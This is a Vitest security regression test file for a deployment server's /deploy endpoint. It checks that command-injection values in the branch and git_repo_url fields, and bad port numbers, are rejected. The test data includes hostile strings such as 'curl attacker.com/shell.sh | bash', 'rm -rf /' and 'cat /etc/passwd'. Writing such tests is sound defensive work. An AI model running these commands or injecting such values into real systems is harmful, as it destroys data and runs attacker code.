import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import { createApp } from '../src/server.js';
import { Registry } from '../src/lib/registry.js';
import { DeployLock } from '../src/lib/lock.js';
import { DeployLogger } from '../src/lib/logger.js';
import { CaddyManager } from '../src/lib/caddy.js';
import { mkdtempSync, rmSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

describe('Security regression tests', () => {
  let tempDir, app, shellCalls;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'prolato-security-test-'));
    const caddyDir = join(tempDir, 'caddy');
    mkdirSync(caddyDir, { recursive: true });
    shellCalls = [];

    const config = {
      deployToken: 'test-token-12345',
      domain: 'example.dev',
      projectsDir: join(tempDir, 'projects'),
      dockerProjectsDir: join(tempDir, 'docker-projects'),
      giteaUrl: 'https://git.example.dev',
    };
    const registry = new Registry(join(tempDir, 'registry.json'));
    const lock = new DeployLock();
    const logger = new DeployLogger(join(tempDir, 'deploy-log.jsonl'));
    const mockShell = {
      exec: async (cmd) => { shellCalls.push(cmd); return ''; },
      execSafe: async (cmd, args) => { shellCalls.push({ cmd, args }); return 'abc123\n'; },
    };
    const caddy = new CaddyManager(caddyDir, config.domain, mockShell);
    app = createApp({ config, registry, lock, logger, caddy, shell: mockShell });
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  const AUTH = 'Bearer test-token-12345';

  describe('Command injection via branch', () => {
    const injections = [
      'main; rm -rf /',
      'main && curl attacker.com/shell.sh | bash',
      'main$(whoami)',
      'main`id`',
      'main | cat /etc/passwd',
      'main\n rm -rf /',
    ];

    for (const branch of injections) {
      it(`rejects branch: "${branch}"`, async () => {
        const res = await request(app)
          .post('/deploy')
          .set('Authorization', AUTH)
          .send({
            project_name: 'test-app',
            git_repo_url: 'git@git.example.dev:alice/test.git',
            branch,
            deploy_type: 'static',
            owner: 'alice',
          });
        expect(res.status).toBe(400);
        expect(res.body.error).toMatch(/branch/i);
      });
    }
  });

  describe('Command injection via git_repo_url', () => {
    const injections = [
      'git@host:repo.git; rm -rf /',
      'https://host/repo.git && curl evil.com',
      'git@host:repo.git$(id)',
    ];

    for (const git_repo_url of injections) {
      it(`rejects git_repo_url: "${git_repo_url}"`, async () => {
        const res = await request(app)
          .post('/deploy')
          .set('Authorization', AUTH)
          .send({
            project_name: 'test-app',
            git_repo_url,
            branch: 'main',
            deploy_type: 'static',
            owner: 'alice',
          });
        expect(res.status).toBe(400);
        expect(res.body.error).toMatch(/git_repo_url/i);
      });
    }
  });

  describe('Invalid port values', () => {
    it('rejects port 0', async () => {
      const res = await request(app)
        .post('/deploy')
        .set('Authorization', AUTH)
        .send({
          project_name: 'test-app',
          git_repo_url: 'git@git.example.dev:alice/test.git',
          branch: 'main',
          deploy_type: 'docker',
          owner: 'alice',
          port: 0,
        });
      expect(res.status).toBe(400);
    });

    it('rejects privileged port 80', async () => {
      const res = await request(app)
        .post('/deploy')
        .set('Authorization', AUTH)
        .send({
          project_name: 'test-app',
          git_repo_url: 'git@git.example.dev:alice/test.git',
          branch: 'main',
          deploy_type: 'docker',
          owner: 'alice',
          port: 80,
        });
      expect(res.status).toBe(400);
    });
  });
});
